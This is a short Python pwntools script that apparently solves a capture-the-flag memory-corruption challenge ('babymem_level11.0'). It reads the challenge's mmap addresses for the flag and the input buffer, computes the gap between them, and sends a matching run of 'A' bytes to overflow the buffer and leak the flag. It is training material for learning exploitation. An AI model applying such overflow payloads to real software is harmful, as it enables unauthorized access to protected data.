from pwn import *

p = process("/challenge/babymem_level11.0")
while True:
    cont = p.recvline(keepends="False")
    cont = cont.decode()
    print(cont)
    if cont.startswith("Called mmap(0, 0x1000, 4, MAP_SHARED, open(\"/flag\", 0), 0)"):
        print("xxxx")
        flags_addr = cont[cont.find("0x", cont.find("=")):]
    if cont.startswith("Called mmap(0, 124, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0)"):
        print("yyyy")
        input_addr = cont[cont.find("0x", cont.find("=")):]
        break
payload_len = int(flags_addr, 16) - int(input_addr,16)
print(payload_len)

p.sendline(str(payload_len))
s=b"A"*(payload_len)
print(s)
p.send(s)
all = p.recvall()
p.close()
all = all.decode()
print(all)


